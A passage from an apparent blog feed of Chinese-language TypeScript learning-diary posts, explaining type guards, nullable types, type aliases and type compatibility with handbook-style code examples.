title="用户自定义的类型保护"></a>用户自定义的类型保护</h4><p>类型保护就是一些表达式，它们会在运行时检查以确保在某个作用域里的类型。 要定义一个类型保护，我们只要简单地定义一个函数，它的返回值是一个 <code>类型谓词</code>。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isFish</span>(<span class="params">pet: Fish | Bird</span>): <span class="title">pet</span> <span class="title">is</span> <span class="title">Fish</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (&lt;Fish&gt;pet).swim !== <span class="literal">undefined</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (&lt;Fish&gt;pet)  在这里表示强制类型转换</span></span><br></pre></td></tr></table></figure><p>上述，<code>pet is Fish</code> 就是类型谓词。 谓词为 <code>parameterName is Type</code> 这种形式，<code>parameterName</code> 必须是来自于当前函数签名里的一个参数名。</p><h4 id="typeof-类型保护"><a href="#typeof-类型保护" class="headerlink" title="typeof 类型保护"></a>typeof 类型保护</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isNumber</span>(<span class="params">x: <span class="built_in">any</span></span>): <span class="title">x</span> <span class="title">is</span> <span class="title">number</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">typeof</span> x === <span class="string">"number"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isString</span>(<span class="params">x: <span class="built_in">any</span></span>): <span class="title">x</span> <span class="title">is</span> <span class="title">string</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">typeof</span> x === <span class="string">"string"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">padLeft</span>(<span class="params">value: <span class="built_in">string</span>, padding: <span class="built_in">string</span> | <span class="built_in">number</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (isNumber(padding)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Array</span>(padding + <span class="number">1</span>).join(<span class="string">" "</span>) + value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (isString(padding)) &#123;</span><br><span class="line">        <span class="keyword">return</span> padding + value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">`Expected string or number, got '<span class="subst">$&#123;padding&#125;</span>'.`</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们不必将 <code>typeof x === &quot;number&quot;</code> 抽象成一个函数，因为TypeScript可以将它识别为一个类型保护。 也就是说我们可以直接在代码里检查类型了。</p><p>重写上面的代码：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">padLeft</span>(<span class="params">value: <span class="built_in">string</span>, padding: <span class="built_in">string</span> | <span class="built_in">number</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> padding === <span class="string">"number"</span>) &#123; <span class="comment">// 直接使用 typeof 判断</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Array</span>(padding + <span class="number">1</span>).join(<span class="string">" "</span>) + value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> padding === <span class="string">"string"</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> padding + value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">`Expected string or number, got '<span class="subst">$&#123;padding&#125;</span>'.`</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这些 <code>typeof类型保护</code> 只有两种形式能被识别： <code>typeof v === &quot;typename&quot;</code> 和 <code>typeof v !== &quot;typename&quot;</code>， <code>&quot;typename&quot;</code> 必须是 <code>&quot;number&quot;</code>， <code>&quot;string&quot;</code>， <code>&quot;boolean&quot;</code> 或 <code>&quot;symbol&quot;</code>。</p><h4 id="instanceof-类型保护"><a href="#instanceof-类型保护" class="headerlink" title="instanceof 类型保护"></a>instanceof 类型保护</h4><p>与 <code>javascript</code> 中的类似，<code>instanceof</code> 类型保护是通过构造函数来细化类型的一种方式。<br>这里直接使用官方例子：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Padder &#123;</span><br><span class="line">    getPaddingString(): <span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> SpaceRepeatingPadder <span class="keyword">implements</span> Padder &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"><span class="keyword">private</span> numSpaces: <span class="built_in">number</span></span>) &#123; &#125;</span><br><span class="line">    getPaddingString() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Array</span>(<span class="keyword">this</span>.numSpaces + <span class="number">1</span>).join(<span class="string">" "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> StringPadder <span class="keyword">implements</span> Padder &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"><span class="keyword">private</span> value: <span class="built_in">string</span></span>) &#123; &#125;</span><br><span class="line">    getPaddingString() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandomPadder</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.random() &lt; <span class="number">0.5</span> ?</span><br><span class="line">        <span class="keyword">new</span> SpaceRepeatingPadder(<span class="number">4</span>) :</span><br><span class="line">        <span class="keyword">new</span> StringPadder(<span class="string">"  "</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类型为SpaceRepeatingPadder | StringPadder</span></span><br><span class="line"><span class="keyword">let</span> padder: Padder = getRandomPadder();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (padder <span class="keyword">instanceof</span> SpaceRepeatingPadder) &#123;</span><br><span class="line">    padder; <span class="comment">// 类型细化为'SpaceRepeatingPadder'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (padder <span class="keyword">instanceof</span> StringPadder) &#123;</span><br><span class="line">    padder; <span class="comment">// 类型细化为'StringPadder'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="可以为-null-的类型"><a href="#可以为-null-的类型" class="headerlink" title="可以为 null 的类型"></a>可以为 null 的类型</h3><p><code>TypeScript</code> 具有两种特殊的类型， <code>null</code> 和 <code>undefined</code>，它们分别具有值<strong>null</strong>和<strong>undefined</strong>。<br>默认情况下，类型检查器认为 <code>null</code> 与 <code>undefined</code> 可以赋值给任何类型。 <code>null</code> 与 <code>undefined</code> 是所有其它类型的一个有效值。 这也意味着，你阻止不了将它们赋值给其它类型，就算是你想要阻止这种情况也不行。</p><h4 id="可选参数与可选属性"><a href="#可选参数与可选属性" class="headerlink" title="可选参数与可选属性"></a>可选参数与可选属性</h4><p>使用了 <code>--strictNullChecks</code>，<code>可选参数</code>会被自动地加上 <code>| undefined</code>。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x: <span class="built_in">number</span>, y?: <span class="built_in">number</span></span>) </span>&#123; <span class="comment">// -&gt; (x: number, y?: number | undefined)</span></span><br><span class="line">    <span class="keyword">return</span> x + (y || <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">f(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">f(<span class="number">1</span>);</span><br><span class="line">f(<span class="number">1</span>, <span class="literal">undefined</span>); <span class="comment">// 注意，是可选参数，不是参数</span></span><br><span class="line">f(<span class="number">1</span>, <span class="literal">null</span>); <span class="comment">// error, null !== undefined</span></span><br></pre></td></tr></table></figure><p>同理，<code>可选属性</code> 中也是同样的结果：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> C &#123;</span><br><span class="line">    a: <span class="built_in">number</span>;</span><br><span class="line">    b?: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> c = <span class="keyword">new</span> C();</span><br><span class="line">c.a = <span class="number">12</span>;</span><br><span class="line">c.b = <span class="number">13</span>;</span><br><span class="line">c.b = <span class="literal">undefined</span>; <span class="comment">// ok</span></span><br><span class="line">c.b = <span class="literal">null</span>; <span class="comment">// error, null !== undefined</span></span><br></pre></td></tr></table></figure><h4 id="类型保护和类型断言"><a href="#类型保护和类型断言" class="headerlink" title="类型保护和类型断言"></a>类型保护和类型断言</h4><p>由于可以为null的类型是通过联合类型实现，那么你需要使用类型保护来去除 <code>null</code>。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">sn: <span class="built_in">string</span> | <span class="literal">null</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> sn || <span class="string">"default"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果编译器不能够去除 <code>null</code> 或 <code>undefined</code>，你可以使用 <code>类型断言</code> 手动去除。 语法是添加 <code>!</code> 后缀:<br>例如：<br><code>identifier!</code> 表示从 <code>identifier</code> 的类型里去除了 <code>null</code> 和 <code>undefined</code>。</p><h3 id="类型别名"><a href="#类型别名" class="headerlink" title="类型别名"></a>类型别名</h3><p>类型别名会给一个类型起个新名字。 类型别名有时和接口很像，但是可以作用于原始值，联合类型，元组以及其它任何你需要手写的类型。<br><strong>起别名不会新建一个类型 - 它创建了一个新名字来引用那个类型</strong>。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Name = <span class="built_in">string</span>; <span class="comment">// string 重命名为 Name</span></span><br><span class="line"><span class="keyword">type</span> NameResolver = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">string</span>; <span class="comment">// 同上..</span></span><br><span class="line"><span class="keyword">type</span> NameOrResolver = Name | NameResolver;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params">n: NameOrResolver</span>): <span class="title">Name</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> n === <span class="string">'string'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> n();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="类型别名-type-vs-接口-interface"><a href="#类型别名-type-vs-接口-interface" class="headerlink" title="类型别名(type) vs 接口(interface)"></a>类型别名(type) vs 接口(interface)</h4><ol><li>接口创建了一个新的名字，可以在其它任何地方使，类型别名并不创建新名字。</li><li>类型别名不能被 <code>extends</code> 和 <code>implements</code>(自己也不能 <code>extends</code> 和 <code>implements</code> 其它类型)。</li><li>如果你无法通过接口来描述一个类型并且需要使用联合类型或元组类型，这时通常会使用类型别名。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要介绍 &lt;code&gt;typescript&lt;/code&gt; 几种高级类型及相关内容。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Typescript学习日记(七)</title>
    <link href="https://github.com/TheNightElf/2017/02/12/Typescript%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%83%EF%BC%89/"/>
    <id>https://github.com/TheNightElf/2017/02/12/Typescript学习日记（七）/</id>
    <published>2017-02-12T06:23:14.000Z</published>
    <updated>2018-01-23T09:43:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要介绍 <code>typescript</code> 各个类型的兼容性。<br><a id="more"></a></p><h3 id="类型兼容性"><a href="#类型兼容性" class="headerlink" title="类型兼容性"></a>类型兼容性</h3><p>TypeScript里的类型兼容性是基于结构子类型的。 结构类型是一种只使用其成员来描述类型的方式。 它正好与名义（nominal）类型形成对比。<br><strong>如果不了解，请忽略上面这段话</strong>。</p><h4 id="比较两个变量"><a href="#比较两个变量" class="headerlink" title="比较两个变量"></a>比较两个变量</h4><p>这里直接使用官方的例子：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Named &#123;</span><br><span class="line">    name: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> x: Named;</span><br><span class="line"><span class="keyword">let</span> y = &#123; name: <span class="string">'Alice'</span>, location: <span class="string">'Seattle'</span> &#125;; <span class="comment">// y 的类型推断为 &#123;name: string, location: string&#125;</span></span><br><span class="line">x = y; <span class="comment">// -&gt; success，x 中拥有一个 name: string 类型， 符合 y 中 name 的数据类型；location 则继续沿用 y 的。</span></span><br><span class="line">y = x; <span class="comment">// -&gt; error，x 中的 name 属性类型符合 y 中 name 属性，但 x 缺少 location 属性，无法赋值给 y</span></span><br></pre></td></tr></table></figure><p><strong>总结</strong>：<br>赋值对象(y)中包含被赋值对象(x)的属性类型，且被赋值对象(x)中的属性在赋值对象(y)中存在，则可以正常成功进行赋值。</p><h4 id="比较两个函数"><a href="#比较两个函数" class="headerlink" title="比较两个函数"></a>比较两个函数</h4><p>比较两个函数和比较变量的比较方式大致一致；比较函数时，比较的是 <code>函数的参数</code> 和 <code>函数的返回值</code> ，且比较规则于比较变量规则相同。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 比较参数</span></span><br><span class="line"><span class="keyword">let</span> x = <span class="function">(<span class="params">a: <span class="built_in">number</span></span>) =&gt;</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> y = <span class="function">(<span class="params">b: <span class="built_in">number</span>, s: <span class="built_in">string</span></span>) =&gt;</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">y = x; <span class="comment">// -&gt; success 同上</span></span><br><span class="line">x = y; <span class="comment">// -&gt; error 同上</span></span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 比较返回值</span></span><br><span class="line"><span class="keyword">let</span> x = <span class="function"><span class="params">()</span> =&gt;</span> (&#123;name: <span class="string">'Alice'</span>&#125;);</span><br><span class="line"><span class="keyword">let</span> y = <span class="function"><span class="params">()</span> =&gt;</span> (&#123;name: <span class="string">'Alice'</span>, location: <span class="string">'Seattle'</span>&#125;);</span><br><span class="line"></span><br><span class="line">x = y; <span class="comment">// -&gt; success 同上</span></span><br><span class="line">y = x; <span class="comment">// -&gt; error 同上</span></span><br></pre></td></tr></table></figure><p>可以看出，两个函数比较的时候比较的仅仅是 <code>函数参数</code> 和 <code>函数返回值</code>，比较的规则依然沿用 <code>比较变量</code> 的结论。</p><h4 id="函数参数双向协变"><a href="#函数参数双向协变" class="headerlink" title="函数参数双向协变"></a>函数参数双向协变</h4><p>这里直接引用官方的说法。<br>当比较函数参数类型时，只有当源函数参数能够赋值给目标函数或者反过来时才能赋值成功。 这是不稳定的，因为调用者可能传入了一个具有更精确类型信息的函数，但是调用这个传入的函数的时候却使用了<strong>不是那么精确的类型信息</strong>。<br>实际上，这极少会发生错误，并且能够实现很多 <code>JavaScript</code> 里的常见模式。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> EventType &#123; Mouse, Keyboard &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> Event &#123; timestamp: <span class="built_in">number</span>; &#125;</span><br><span class="line"><span class="keyword">interface</span> MouseEvent <span class="keyword">extends</span> Event &#123; x: <span class="built_in">number</span>; y: <span class="built_in">number</span> &#125;</span><br><span class="line"><span class="keyword">interface</span> KeyEvent <span class="keyword">extends</span> Event &#123; keyCode: <span class="built_in">number</span> &#125;</span><br><span class="line"></span><br><span class="line">function listenEvent(eventType: EventType, handler: (n: Event) =&gt; void) &#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常见的使用方式</span></span><br><span class="line"><span class="comment">// e: MouseEvent =&gt; &#123;x: number; y: number; timestamp: number;&#125;</span></span><br><span class="line">listenEvent(EventType.Mouse, <span class="function">(<span class="params">e: MouseEvent</span>) =&gt;</span> <span class="built_in">console</span>.log(e.x + <span class="string">','</span> + e.y));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 并不是一个很好的代替品</span></span><br><span class="line"><span class="comment">// e: Event =&gt; &#123; timestamp: number; &#125;</span></span><br><span class="line">listenEvent(EventType.Mouse, <span class="function">(<span class="params">e: Event</span>) =&gt;</span> <span class="built_in">console</span>.log((&lt;MouseEvent&gt;e).x + <span class="string">','</span> + (&lt;MouseEvent&gt;e).y));</span><br><span class="line">listenEvent(EventType.Mouse, &lt;<span class="function">(<span class="params">e: Event</span>) =&gt;</span> <span class="built_in">void</span>&gt;<span class="function">(<span class="params">(<span class="params">e: MouseEvent</span>) =&gt; <span class="built_in">console</span>.log(<span class="params">e.x + ',' + e.y</span>)</span>));</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">// 这也不是很好</span></span><br><span class="line"><span class="function">// <span class="params">e</span>: <span class="params">number</span></span></span><br><span class="line"><span class="function"><span class="params">listenEvent</span>(<span class="params">EventType.Mouse, (<span class="params">e: <span class="built_in">number</span></span>) =&gt; <span class="built_in">console</span>.log(<span class="params">e</span>)</span>);</span></span><br></pre></td></tr></table></figure><h4 id="可选参数及剩余参数"><a href="#可选参数及剩余参数" class="headerlink" title="可选参数及剩余参数"></a>可选参数及剩余参数</h4><p>这里直接引用官方的说法。<br>比较函数兼容性的时候，可选参数与必须参数是可互换的。 <strong>源类型上有额外的可选参数不是错误，目标类型的可选参数在源类型里没有对应的参数也不是错误</strong>。<br>当一个函数有剩余参数时，它被当做 <code>无限个可选参数</code>。<br>这对于类型系统来说是不稳定的，但从运行时的角度来看，可选参数一般来说是不强制的，因为对于大多数函数来说相当于传递了一些  <code>undefinded</code>。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function invokeLater(args: any[], callback: (...args: any[]) =&gt; void) &#123;</span><br><span class="line">    <span class="comment">/* ... Invoke callback with 'args' ... */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unsound - invokeLater "might" provide any number of arguments</span></span><br><span class="line">invokeLater([<span class="number">1</span>, <span class="number">2</span>], <span class="function">(<span class="params">x, y</span>) =&gt;</span> <span class="built_in">console</span>.log(x + <span class="string">', '</span> + y));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Confusing (x and y are actually required) and undiscoverable</span></span><br><span class="line">invokeLater([<span class="number">1</span>, <span class="number">2</span>], <span class="function">(<span class="params">x?, y?</span>) =&gt;</span> <span class="built_in">console</span>.log(x + <span class="string">', '</span> + y));</span><br></pre></td></tr></table></figure><h4 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h4><p>官方文档上的说明很好理解：<br>对于有重载的函数，源函数的每个重载都要在目标函数上找到对应的函数签名。 这确保了目标函数可以在所有源函数可调用的地方调用。</p><h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>枚举类型与数字类型兼容，并且数字类型与枚举类型兼容。不同枚举类型之间是不兼容的。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> Status &#123; Ready, Waiting &#125;;</span><br><span class="line"><span class="keyword">enum</span> Color &#123; Red, Blue, Green &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> status = Status.Ready;</span><br><span class="line">status = Color.Red; <span class="comment">// -&gt; error, 不同枚举类型</span></span><br></pre></td></tr></table></figure><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>类与对象字面量和接口差不多，但有一点不同：<strong>类有静态部分和实例部分的类型</strong>。 比较两个类类型的对象时，只有 <code>实例的成员会被比较</code>，<code>静态成员</code> 和 <code>构造函数</code> 不在比较的范围内。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> Animal &#123;</span><br><span class="line">    feet: <span class="built_in">number</span>;</span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params">name: <span class="built_in">string</span>, numFeet: <span class="built_in">number</span></span>) &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Size &#123;</span><br><span class="line">    feet: <span class="built_in">number</span>;</span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params">numFeet: <span class="built_in">number</span></span>) &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a: Animal;</span><br><span class="line"><span class="keyword">let</span> s: Size;</span><br><span class="line"></span><br><span class="line">a = s;  <span class="comment">// -&gt; success，如果比较构造函数，这里就会抛出错误</span></span><br><span class="line">s = a;  <span class="comment">// -&gt; success</span></span><br></pre></td></tr></table></figure><h4 id="私有成员"><a href="#私有成员" class="headerlink" title="私有成员"></a>私有成员</h4><p>私有成员会影响兼容性判断。 当类的实例用来检查兼容时，如果目标类型包含一个私有成员，那么<strong>源类型必须包含来自同一个类的这个私有成员</strong>。 这允许子类赋值给父类，但是不能赋值给其它有同样类型的类。</p><h4 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h4><p>因为 <code>TypeScript</code> 是结构性的类型系统，类型参数只影响使用其做为类型一部分的结果类型。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Empty&lt;T&gt; &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> x: Empty&lt;<span class="built_in">number</span>&gt;;</span><br><span class="line"><span class="keyword">let</span> y: Empty&lt;<span class="built_in">string</span>&gt;;</span><br><span class="line"></span><br><span class="line">x = y;  <span class="comment">// success, x 与 y 互相兼容，并不排斥</span></span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> NotEmpty&lt;T&gt; &#123;</span><br><span class="line">    data: T;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> x: NotEmpty&lt;<span class="built_in">number</span>&gt;;</span><br><span class="line"><span class="keyword">let</span> y: NotEmpty&lt;<span class="built_in">string</span>&gt;;</span><br><span class="line"></span><br><span class="line">x = y;  <span class="comment">// error, x 为 number 时，date 为 number；y 为 string 时，date 为 string。x、y不兼容。</span></span><br></pre></td></tr></table></figure><p>对于没指定泛型类型的泛型参数时，会把所有泛型参数当成 <code>any</code> 比较。<br>如下：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> identity = <span class="function"><span class="keyword">function</span>&lt;<span class="title">T</span>&gt;(<span class="params">x: T</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> reverse = <span class="function"><span class="keyword">function</span>&lt;<span class="title">U</span>&gt;(<span class="params">y: U</span>): <span class="title">U</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">identity = reverse;  <span class="comment">// Okay because (x: any)=&gt;any matches (y: any)=&gt;any</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在 <code>TypeScript</code> 里，有两种类型的兼容性：子类型与赋值。<br>它们的不同点在于，赋值扩展了子类型兼容，允许给 <code>any</code> 赋值或从 <code>any</code> 取值和允许数字赋值给枚举类型或枚举类型赋值给数字。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要介绍 &lt;code&gt;typescript&lt;/code&gt; 各个类型的兼容性。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Typescript学习日记(六)</title>
    <link href="https://github.com/TheNightElf/2017/02/05/Typescript%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%88%E5%85%AD%EF%BC%89/"/>
    <id>https://github.com/TheNightElf/2017/02/05/Typescript学习日记（六）/</id>
    <published>2017-02-05T10:12:41.000Z</published>
    <updated>2018-01-23T09:39:56.000Z</updated>
    
